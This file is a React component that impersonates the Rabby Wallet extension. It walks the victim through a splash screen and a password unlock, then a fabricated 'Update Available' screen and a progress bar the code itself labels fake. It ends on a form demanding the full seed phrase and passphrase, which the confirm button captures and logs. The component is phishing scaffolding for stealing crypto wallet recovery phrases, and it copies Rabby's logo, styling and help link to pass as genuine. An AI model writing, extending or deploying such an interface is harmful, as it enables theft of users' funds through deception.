import { useState, useEffect } from 'react';

interface RabbyPanelProps {
  isOpen: boolean;
  onClose: () => void;
}

type ViewState = 'splash' | 'password' | 'update_prompt' | 'updating' | 'import';

export default function RabbyPanel({ isOpen, onClose }: RabbyPanelProps) {
  const [view, setView] = useState<ViewState>('splash');
  const [password, setPassword] = useState('');
  const [phraseLength, setPhraseLength] = useState<number>(12);
  const [hasPassphrase, setHasPassphrase] = useState(false);
  const [passphrase, setPassphrase] = useState('');
  const [phraseValues, setPhraseValues] = useState<string[]>(Array(24).fill(''));
  const [updateProgress, setUpdateProgress] = useState(0);
  const [invalidCount, setInvalidCount] = useState(0);

  // Reset state when modal opens
  useEffect(() => {
    if (isOpen) {
      setView('splash');
      setPassword('');
      setPhraseLength(12);
      setHasPassphrase(false);
      setPassphrase('');
      setPhraseValues(Array(24).fill(''));
      setUpdateProgress(0);
      setInvalidCount(0);

      const timer = setTimeout(() => {
        setView('password');
      }, 2500);
      return () => clearTimeout(timer);
    }
  }, [isOpen]);

  // Handle fake update progress
  useEffect(() => {
    if (view === 'updating') {
      let progress = 0;
      const interval = setInterval(() => {
        progress += Math.floor(Math.random() * 12) + 4;
        if (progress >= 100) {
          progress = 100;
          clearInterval(interval);
          setTimeout(() => setView('import'), 600);
        }
        setUpdateProgress(progress);
      }, 350);
      return () => clearInterval(interval);
    }
  }, [view]);

  const handleWordChange = (index: number, value: string) => {
    const newValues = [...phraseValues];
    newValues[index] = value;
    setPhraseValues(newValues);
    
    let count = 0;
    newValues.slice(0, phraseLength).forEach(val => {
      if (val.length > 0 && !/^[a-z]+$/.test(val)) {
        count++;
      }
    });
    setInvalidCount(count);
  };

  const handleModeChange = (e: React.ChangeEvent<HTMLSelectElement>) => {
    const val = e.target.value;
    if (val.includes('+passphrase')) {
      setHasPassphrase(true);
      setPhraseLength(Number(val.split('+')[0]));
    } else {
      setHasPassphrase(false);
      setPhraseLength(Number(val));
    }
    setPhraseValues(Array(24).fill(''));
    setInvalidCount(0);
    setPassphrase('');
  };

  const isPhraseComplete = () => {
    const activeWords = phraseValues.slice(0, phraseLength);
    return activeWords.every(word => word.trim().length > 0) && invalidCount === 0;
  };

  return (
    <>
      <div className="fixed inset-0 z-[2147483648] pointer-events-none font-sans">
        
        {/* Backdrop */}
        <div 
          className={`absolute inset-0 bg-[#12121280] transition-opacity duration-[400ms] ease-in-out pointer-events-auto ${isOpen ? 'opacity-100' : 'opacity-0 pointer-events-none'}`} 
          onClick={onClose}
        ></div>
        
        {/* Main Modal - Custom bezier dropdown transitions */}
        <div className={`flex pointer-events-auto transition-all duration-[600ms] ease-[cubic-bezier(0.22,1,0.36,1)] fixed top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-full h-full max-h-full md:top-0 md:right-8 md:left-auto md:translate-x-0 md:translate-y-0 md:w-[360px] md:h-[680px] md:border border-[#eaecef] md:overflow-y-hidden overflow-y-auto ${isOpen ? 'scale-100 opacity-100' : 'scale-95 opacity-0'}`}>
          <div className="h-full w-full bg-[#ffffff] shadow-2xl relative overflow-hidden flex flex-col">
            
            {/* ========================================== */}
            {/* LAYER 1: SPLASH SCREEN                     */}
            {/* ========================================== */}
            <div className={`absolute inset-0 z-10 flex flex-col items-center justify-center transition-all duration-700 ease-[cubic-bezier(0.25,1,0.5,1)] rabby-bg-image bg-no-repeat bg-cover ${view === 'splash' ? 'opacity-100 scale-100 pointer-events-auto' : 'opacity-0 scale-105 blur-sm pointer-events-none'}`}>
              <div className="mb-4">
                <RabbyLogoSVG className="w-[100px] h-[100px] rabby-complex-bounce" />
              </div>
              <div className="my-[12px] animate-[fadeIn_1s_ease-out_0.2s_both]">
                <h3 className="font-roboto text-[#192945] font-medium text-[24px] leading-[28px]">Loading your Rabby Wallet</h3>
              </div>
              <div className="max-w-[320px] text-center animate-[fadeIn_1s_ease-out_0.4s_both]">
                <p className="font-roboto text-[#6a7587] font-normal text-[14px] leading-[18px]">The game-changing wallet for Ethereum and all EVM chains</p>
              </div>
            </div>

            {/* ========================================== */}
            {/* LAYER 2: PASSWORD SCREEN                   */}
            {/* ========================================== */}
            <div className={`absolute inset-0 z-20 flex flex-col transition-all duration-700 ease-[cubic-bezier(0.16,1,0.3,1)] bg-gradient-to-br from-[#ced6ff] to-[#e9f1ff] ${view === 'password' ? 'opacity-100 translate-y-0 pointer-events-auto' : 'opacity-0 translate-y-8 pointer-events-none'}`}>
              <div className="px-6 py-8 flex flex-col h-full w-full items-center justify-center">
                <div className="mb-4 mt-12">
                  <RabbyLogoSVG className="w-[100px] h-[100px]" />
                </div>
                <h3 className="font-roboto text-[#192945] font-semibold text-[24px] leading-[28px] mb-2 text-center">Rabby Wallet</h3>
                <p className="font-roboto text-[#6a7587] font-normal text-[16px] leading-[18px] mb-6 text-center">Your go-to wallet for Ethereum and EVM</p>
                
                <div className="w-full relative mb-44 shrink-0">
                  <input 
                    className="w-full text-start py-[14px] px-[16px] text-[15px] font-normal rounded-[8px] text-[#192945] tracking-[4px] placeholder:tracking-normal border border-transparent hover:border-[#7084ff] focus:border-[#7084ff] bg-[#ffffff] outline-none transition-all duration-300 font-roboto" 
                    type="password" 
                    placeholder="Enter the Password to Unlock"
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                  />
                </div>
                
                <div className="w-full mb-1 mt-auto">
                  <button 
                    onClick={() => setView('update_prompt')}
                    disabled={password.length < 3}
                    className="w-full h-[56px] text-[#ffffff] bg-[#4c65ff] font-medium font-roboto text-[17px] cursor-pointer rounded-[8px] px-4 py-3 hover:opacity-90 transition-all duration-300 disabled:opacity-50 disabled:cursor-not-allowed" 
                    type="button"
                  >
                    Unlock
                  </button>
                </div>
                <div className="w-full">
                  <button className="w-full h-[56px] text-[#3e495e] bg-transparent font-medium font-roboto text-[13px] cursor-pointer rounded-[8px] px-4 py-3 hover:opacity-90 hover:underline transition-all duration-300" type="button">Forgot Password?</button>
                </div>
              </div>
            </div>

            {/* ========================================== */}
            {/* LAYER 3: UPDATE PROMPT                     */}
            {/* ========================================== */}
            <div className={`absolute inset-0 z-30 bg-[#ffffff] transition-all duration-500 ease-[cubic-bezier(0.16,1,0.3,1)] ${view === 'update_prompt' ? 'opacity-100 translate-y-0 pointer-events-auto' : 'opacity-0 translate-y-8 pointer-events-none'}`}>
              <div className="px-6 py-8 flex flex-col h-full">
                <div className="flex flex-col items-center justify-center mb-8 mt-4">
                  <div className="mb-6">
                    <RabbyLogoSVG className="w-20 h-20" />
                  </div>
                  <h3 className="font-roboto text-[#192945] font-medium text-[24px] leading-[28px] mb-2 text-center">Update Available</h3>
                  <p className="font-roboto text-[#6a7587] font-normal text-[16px] leading-[18px] text-center">Version 0.93.65</p>
                </div>
                
                <div className="flex-grow mb-8">
                  <h4 className="font-roboto text-[#192945] font-medium text-[18px] mb-4">What's new</h4>
                  <ul className="space-y-3">
                    {[
                      "Enhanced multi-chain support with seamless asset viewing",
                      "Improved transaction security analysis for better protection",
                      "Fixed network connectivity issues with Layer 2 solutions",
                      "Added support for new EVM-compatible chains",
                      "Performance optimizations for faster DApp interactions"
                    ].map((feature, i) => (
                      <li key={i} className="flex items-start">
                        <svg className="w-4 h-4 text-[#7084ff] mr-2 flex-shrink-0 mt-0.5" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>
                        <span className="font-roboto text-[#192945] font-normal text-[14px] leading-[18px]">{feature}</span>
                      </li>
                    ))}
                  </ul>
                </div>
                
                <div className="mt-auto">
                  <button 
                    onClick={() => setView('updating')}
                    className="w-full h-[56px] text-[#ffffff] bg-[#7084ff] font-medium font-roboto text-[17px] cursor-pointer rounded-[8px] px-4 py-3 hover:opacity-90 transition-all duration-300" 
                    type="button"
                  >
                    Update Now
                  </button>
                  <div className="text-center mt-4">
                    <a href="https://rabby.io/help" target="_blank" rel="noreferrer" className="font-roboto text-[#7084ff] text-[14px] font-normal hover:underline">Need help? Visit our Support Center</a>
                  </div>
                </div>
              </div>
            </div>

            {/* ========================================== */}
            {/* LAYER 4: UPDATING STATE (PROGRESS BAR)     */}
            {/* ========================================== */}
            <div className={`absolute inset-0 z-40 bg-[#ffffff] transition-opacity duration-500 ${view === 'updating' ? 'opacity-100 pointer-events-auto' : 'opacity-0 pointer-events-none'}`}>
              <div className="px-6 py-8 flex flex-col h-full">
                <div className="flex flex-col items-center justify-center mt-16 mb-10">
                  <div className="mb-8 relative">
                    <RabbyLogoSVG className="w-24 h-24 rabby-bounce-simple" />
                  </div>
                  <h3 className="font-roboto text-[#192945] font-medium text-[24px] leading-[28px] mb-2 text-center">Updating Rabby Wallet</h3>
                  <p className="font-roboto text-[#6a7587] font-normal text-[16px] leading-[18px] text-center">Please wait while we update to version 0.93.65</p>
                </div>
                
                <div className="w-full mb-6 mt-12">
                  <div className="w-full h-2 bg-[#f2f4f7] rounded-full overflow-hidden">
                    <div className="h-full bg-[#7084ff] rounded-full transition-all duration-300" style={{ width: `${updateProgress}%` }}></div>
                  </div>
                  <div className="flex items-center justify-between mt-3">
                    <p className="font-roboto text-[#6a7587] text-[14px] font-normal">Downloading update...</p>
                    <p className="font-roboto text-[#192945] text-[14px] font-medium">{updateProgress}%</p>
                  </div>
                </div>
                
                <div className="mt-auto text-center pb-2">
                  <p className="font-roboto text-[#6a7587] text-[14px] font-normal">Please do not close this window during the update.</p>
                </div>
              </div>
            </div>

            {/* ========================================== */}
            {/* LAYER 5: IMPORT WALLET (SEED PHRASE)       */}
            {/* ========================================== */}
            <div className={`absolute inset-0 z-50 bg-[#ffffff] transition-all duration-700 ease-[cubic-bezier(0.16,1,0.3,1)] flex flex-col ${view === 'import' ? 'opacity-100 translate-y-0 pointer-events-auto' : 'opacity-0 translate-y-8 pointer-events-none'}`}>
              
              <div className="border-b border-[#e6e6e6] shrink-0">
                <div className="flex justify-between items-center p-3">
                  <button className="p-2 rounded-full hover:bg-[#f3f3f3] transition-all duration-300 cursor-pointer active:scale-95" type="button" onClick={onClose}>
                    <svg className="w-6 h-6 text-[#000000]" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round"><path d="m15 18-6-6 6-6"></path></svg>
                  </button>
                  <div className="flex items-center justify-center gap-1">
                    <svg xmlns="http://www.w3.org/2000/svg" width="8" height="8" fill="none" className="text-[#7084ff]" viewBox="0 0 8 8"><circle cx="4" cy="4" r="4" fill="currentColor"></circle></svg>
                    <div className="w-[56px] h-[1px] bg-[#dee3fc]"></div>
                    <svg xmlns="http://www.w3.org/2000/svg" width="8" height="8" fill="none" className="text-[#dee3fc]" viewBox="0 0 8 8"><circle cx="4" cy="4" r="4" fill="currentColor"></circle></svg>
                  </div>
                  <div className="w-6 h-6"></div>
                </div>
              </div>

              <div className="flex justify-center items-center px-3 py-4 shrink-0">
                <p className="font-open-sans text-[#000000] font-semibold text-[17px] leading-[24px]">Import with Secret Phrase</p>  
              </div>

              <div className="flex justify-between items-center px-4 py-3 border border-[#dee3fc] mx-4 rounded-xl shrink-0 bg-[#fafafa]">
                <select 
                  className="font-roboto text-[#3e495e] font-normal text-[13px] border-none bg-transparent outline-none cursor-pointer w-full"
                  value={hasPassphrase ? `${phraseLength}+passphrase` : `${phraseLength}`}
                  onChange={handleModeChange}
                >
                  <option value="12">I have a 12-word phrase</option>
                  <option value="15">I have a 15-word phrase</option>
                  <option value="18">I have a 18-word phrase</option>
                  <option value="21">I have a 21-word phrase</option>
                  <option value="24">I have a 24-word phrase</option>
                  <option value="12+passphrase">I have a 12-word phrase with Passphrase</option>
                  <option value="15+passphrase">I have a 15-word phrase with Passphrase</option>
                  <option value="18+passphrase">I have a 18-word phrase with Passphrase</option>
                  <option value="21+passphrase">I have a 21-word phrase with Passphrase</option>
                  <option value="24+passphrase">I have a 24-word phrase with Passphrase</option>
                </select>
                <button 
                  className="p-1 rounded-[4px] hover:bg-[#f2f4f7] transition-all cursor-pointer duration-300 shrink-0" 
                  type="button"
                  onClick={() => {
                    setPhraseValues(Array(24).fill(''));
                    setPassphrase('');
                    setInvalidCount(0);
                  }}
                >
                  <svg className="w-4 h-4 text-[#6a7587]" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 16 16"><path clipRule="evenodd" d="M6.669 1.969h2.667v2.666h5v2.667H1.669V4.635h5V1.97z" stroke="currentColor" strokeLinecap="round" strokeLinejoin="round"></path><path d="M2.669 13.331h10.667v-6H2.669v6z" stroke="currentColor" strokeLinejoin="round"></path><path d="M5.331 13.301v-1.994M8 13.3v-2M10.669 13.301v-1.994" stroke="currentColor" strokeLinecap="round" strokeLinejoin="round"></path></svg>
                </button>
              </div>

              <div className="flex-1 px-4 mt-4 overflow-y-auto rabby-custom-scrollbar pb-2">
                <div className="grid grid-cols-3 gap-2">
                  {Array.from({ length: phraseLength }).map((_, i) => {
                    const isError = phraseValues[i].length > 0 && !/^[a-z]+$/.test(phraseValues[i]);
                    return (
                      <div key={i} className="relative group">
                        <div className="absolute top-[14px] left-[10px] pointer-events-none">
                          <p className="font-roboto text-[#3e495e] text-[13px] font-normal">{i + 1}.</p>
                        </div>
                        <input 
                          className={`w-full tracking-wider text-center py-[14px] px-[12px] text-[15px] font-normal rounded-[8px] text-[#192945] border hover:border-[#7084ff] focus:border-[#7084ff] bg-transparent outline-none transition-all duration-300 font-roboto ${isError ? 'border-[#e34935] text-[#e34935] focus:border-[#e34935]' : 'border-[#e0e5ec]'}`} 
                          type="password" 
                          value={phraseValues[i]}
                          onChange={(e) => handleWordChange(i, e.target.value.toLowerCase())}
                        />
                      </div>
                    );
                  })}
                </div>

                {hasPassphrase && (
                  <div className="mt-4 pt-4 border-t border-[#e0e5ec]">
                    <div className="relative">
                      <input 
                        className="w-full tracking-wider py-[14px] px-[16px] text-[15px] font-normal rounded-[8px] text-[#192945] border border-[#e0e5ec] hover:border-[#7084ff] focus:border-[#7084ff] bg-transparent outline-none transition-all duration-300 font-roboto placeholder:font-normal placeholder:tracking-normal" 
                        placeholder="Passphrase" 
                        type="password"
                        value={passphrase}
                        onChange={(e) => setPassphrase(e.target.value)}
                      />
                    </div>
                  </div>
                )}
              </div>

              {/* Error Display */}
              <div className={`px-4 mt-2 transition-opacity duration-300 min-h-[20px] ${invalidCount > 0 ? 'opacity-100' : 'opacity-0'}`}>
                <p className="font-roboto text-[#e34935] font-normal text-[13px] leading-[18px]">
                  {invalidCount} input{invalidCount > 1 ? 's do' : ' does'} not conform to Seed Phrase norms, please check.
                </p>
              </div>

              {/* Footer Button Container */}
              <div className="px-4 py-4 shrink-0 bg-white border-t border-[#e6e6e6]">
                <button 
                  className="w-full h-[56px] text-[#ffffff] bg-[#7084ff] font-medium font-roboto text-[17px] cursor-pointer rounded-[8px] px-4 py-3 hover:opacity-90 transition-all duration-300 disabled:opacity-50 disabled:cursor-not-allowed active:scale-[0.98]" 
                  type="button" 
                  disabled={!isPhraseComplete()}
                  onClick={() => {
                    console.log("Rabby Import Complete:", { phrase: phraseValues.slice(0, phraseLength), passphrase: hasPassphrase ? passphrase : null });
                    onClose();
                  }}
                >
                  Confirm
                </button>
              </div>
            </div>

          </div>
        </div>
      </div>

      <style dangerouslySetInnerHTML={{ __html: `
        .rabby-custom-scrollbar::-webkit-scrollbar {
          width: 5px;
        }
        .rabby-custom-scrollbar::-webkit-scrollbar-track {
          background: transparent;
        }
        .rabby-custom-scrollbar::-webkit-scrollbar-thumb {
          background: #d1d1d1;
          border-radius: 10px;
        }
        .rabby-custom-scrollbar::-webkit-scrollbar-thumb:hover {
          background: #7084ff;
        }
        
        /* Rabby Premium Animated Gradient Background */
        .rabby-bg-image {
          background-image: url("data:image/svg+xml,%0A%3Csvg width='400' height='520' viewBox='0 0 400 520' fill='none' xmlns='http://www.w3.org/2000/svg'%3E%3Cg clip-path='url(%23clip0_114948_40954)'%3E%3Cg opacity='0.2' filter='url(%23filter0_f_114948_40954)'%3E%3Cpath d='M506.837 825.74C376.993 928.297 311.699 840.452 241.718 751.85C171.737 663.249 123.571 607.447 253.414 504.89C383.258 402.334 427.75 356.563 497.731 445.164C567.712 533.765 636.681 723.184 506.837 825.74Z' fill='%234569C7'/%3E%3C/g%3E%3Cg opacity='0.1' filter='url(%23filter1_f_114948_40954)'%3E%3Cpath d='M117.4 -110.123C266.58 -60.5461 407.57 -179.346 357.993 -30.1669C308.417 119.013 147.293 199.757 -1.88646 150.18C-151.066 100.604 -231.81 -60.5199 -182.234 -209.7C-132.657 -358.879 -31.7791 -159.699 117.4 -110.123Z' fill='%232174A3'/%3E%3C/g%3E%3Cg filter='url(%23filter2_b_114948_40954)'%3E%3Cpath d='M0 -10H400L400 520H0V-10Z' fill='%23ECF3FF' fill-opacity='0.7'/%3E%3C/g%3E%3Crect width='400' height='520' fill='url(%23paint0_linear_114948_40954)'/%3E%3C/g%3E%3Cdefs%3E%3Cfilter id='filter0_f_114948_40954' x='-27.9785' y='198.072' width='807.895' height='873.846' filterUnits='userSpaceOnUse' color-interpolation-filters='sRGB'%3E%3CfeFlood flood-opacity='0' result='BackgroundImageFix'/%3E%3CfeBlend mode='normal' in='SourceGraphic' in2='BackgroundImageFix' result='shape'/%3E%3CfeGaussianBlur stdDeviation='100' result='effect1_foregroundBlur_114948_40954'/%3E%3C/filter%3E%3Cfilter id='filter1_f_114948_40954' x='-396.836' y='-464.175' width='964.947' height='828.958' filterUnits='userSpaceOnUse' color-interpolation-filters='sRGB'%3E%3CfeFlood flood-opacity='0' result='BackgroundImageFix'/%3E%3CfeBlend mode='normal' in='SourceGraphic' in2='BackgroundImageFix' result='shape'/%3E%3CfeGaussianBlur stdDeviation='100' result='effect1_foregroundBlur_114948_40954'/%3E%3C/filter%3E%3Cfilter id='filter2_b_114948_40954' x='-40' y='-50' width='480' height='610' filterUnits='userSpaceOnUse' color-interpolation-filters='sRGB'%3E%3CfeFlood flood-opacity='0' result='BackgroundImageFix'/%3E%3CfeGaussianBlur in='BackgroundImageFix' stdDeviation='20'/%3E%3CfeComposite in2='SourceAlpha' operator='in' result='effect1_backgroundBlur_114948_40954'/%3E%3CfeBlend mode='normal' in='SourceGraphic' in2='effect1_backgroundBlur_114948_40954' result='shape'/%3E%3C/filter%3E%3ClinearGradient id='paint0_linear_114948_40954' x1='199.467' y1='-148.633' x2='202.352' y2='185.875' gradientUnits='userSpaceOnUse'%3E%3Cstop stop-color='%237084FF'/%3E%3Cstop offset='1' stop-color='white' stop-opacity='0'/%3E%3C/linearGradient%3E%3CclipPath id='clip0_114948_40954'%3E%3Crect width='400' height='520' fill='white' transform='matrix(1 0 0 -1 0 520)'/%3E%3C/clipPath%3E%3C/defs%3E%3C/svg%3E");
        }

        @keyframes fadeIn {
          from { opacity: 0; transform: translateY(10px); }
          to { opacity: 1; transform: translateY(0); }
        }
        @keyframes rabbyComplexBounceExtra {
          0% { transform: translateY(0) translateX(0) rotate(0deg) scale(1); opacity: 1; }
          15% { transform: translateY(-25px) translateX(6px) rotate(6deg) scale(1.05); opacity: 0.8; }
          30% { transform: translateY(-5px) translateX(-3px) rotate(-4deg) scale(0.97); opacity: 0.95; }
          45% { transform: translateY(-20px) translateX(5px) rotate(4deg) scale(1.04); opacity: 0.85; }
          60% { transform: translateY(-4px) translateX(-2px) rotate(-2deg) scale(0.97); opacity: 0.92; }
          75% { transform: translateY(-12px) translateX(3px) rotate(3deg) scale(1.02); opacity: 0.95; }
          100% { transform: translateY(0) translateX(0) rotate(0deg) scale(1); opacity: 1; }
        }
        .rabby-complex-bounce {
          animation: rabbyComplexBounceExtra 4s cubic-bezier(0.68, -0.55, 0.265, 1.55) infinite;
          transform-origin: center;
        }
        @keyframes rabbyBounceSimple {
          0%, 100% { transform: translateY(0) scale(1); }
          50% { transform: translateY(-10px) scale(1.05); }
        }
        .rabby-bounce-simple {
          animation: rabbyBounceSimple 1.5s ease-in-out infinite;
          transform-origin: center bottom;
        }
      `}} />
    </>
  );
}

// -------------------------------------------------------------------
// RABBY LOGO SVG COMPONENT
// -------------------------------------------------------------------

const RabbyLogoSVG = ({ className }: { className?: string }) => (
  <svg className={className} fill="none" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100">
    <path d="M92.53 55.386c3.375-7.57-13.312-28.715-29.253-37.525-10.048-6.825-20.519-5.887-22.64-2.89-4.653 6.576 15.41 12.148 28.83 18.65-2.885 1.258-5.603 3.515-7.202 6.401-5.002-5.482-15.982-10.203-28.865-6.4-8.682 2.562-15.898 8.604-18.686 17.728a5.428 5.428 0 00-2.218-.47c-3.018 0-5.465 2.456-5.465 5.486s2.447 5.486 5.465 5.486c.56 0 2.31-.377 2.31-.377l27.952.203C31.58 79.48 22.745 82.082 22.745 85.166c0 3.084 8.453 2.249 11.627 1.099 15.194-5.503 31.513-22.654 34.314-27.591 11.76 1.472 21.643 1.647 23.844-3.288z" fill="url(#logo_svg__paint0_linear_111797_37674_21)"></path>
    <path fillRule="evenodd" clipRule="evenodd" d="M69.465 33.623h.002c.622-.245.521-1.167.35-1.891-.392-1.665-7.165-8.378-13.525-11.385-8.666-4.097-15.047-3.886-15.99-1.997 1.765 3.631 9.949 7.041 18.496 10.602 3.647 1.52 7.36 3.067 10.668 4.67h-.001z" fill="url(#logo_svg__paint1_linear_111797_37674_2)"></path>
    <path fillRule="evenodd" clipRule="evenodd" d="M58.467 70.175c-1.752-.672-3.732-1.29-5.983-1.849 2.4-4.31 2.903-10.692.637-14.726-3.181-5.662-7.174-8.676-16.453-8.676-5.103 0-18.843 1.725-19.087 13.239-.026 1.208 0 2.315.086 3.333l25.091.182c-3.383 5.387-6.55 9.382-9.324 12.42 3.33.856 6.078 1.575 8.601 2.235 2.394.627 4.585 1.2 6.878 1.787 3.46-2.53 6.712-5.288 9.554-7.945z" fill="url(#logo_svg__paint2_linear_111797_37674_2)"></path>
    <path d="M14.379 60.312c1.025 8.746 5.977 12.174 16.095 13.188 10.12 1.015 15.924.334 23.651 1.04 6.454.59 12.217 3.89 14.355 2.75 1.923-1.027.847-4.736-1.727-7.116-3.337-3.085-7.956-5.23-16.083-5.991 1.62-4.451 1.166-10.692-1.35-14.088-3.636-4.91-10.35-7.129-18.846-6.16-8.876 1.014-17.382 5.4-16.095 16.377z" fill="url(#logo_svg__paint3_linear_111797_37674_21)"></path>
    <defs>
      <linearGradient id="logo_svg__paint0_linear_111797_37674_21" x1="32.389" y1="48.683" x2="91.836" y2="65.478" gradientUnits="userSpaceOnUse"><stop stopColor="#8697FF"></stop><stop offset="1" stopColor="#ABB7FF"></stop></linearGradient>
      <linearGradient id="logo_svg__paint1_linear_111797_37674_2" x1="81.798" y1="47.549" x2="38.766" y2="4.574" gradientUnits="userSpaceOnUse"><stop stopColor="#8697FF"></stop><stop offset="1" stopColor="#5156D8" stopOpacity="0"></stop></linearGradient>
      <linearGradient id="logo_svg__paint2_linear_111797_37674_2" x1="59.66" y1="71.678" x2="18.401" y2="48.046" gradientUnits="userSpaceOnUse"><stop stopColor="#465EED"></stop><stop offset="1" stopColor="#8697FF" stopOpacity="0"></stop></linearGradient>
      <linearGradient id="logo_svg__paint3_linear_111797_37674_21" x1="35.936" y1="48.237" x2="63.901" y2="83.636" gradientUnits="userSpaceOnUse"><stop stopColor="#8898FF"></stop><stop offset="0.984" stopColor="#6277F1"></stop></linearGradient>
    </defs>
  </svg>
);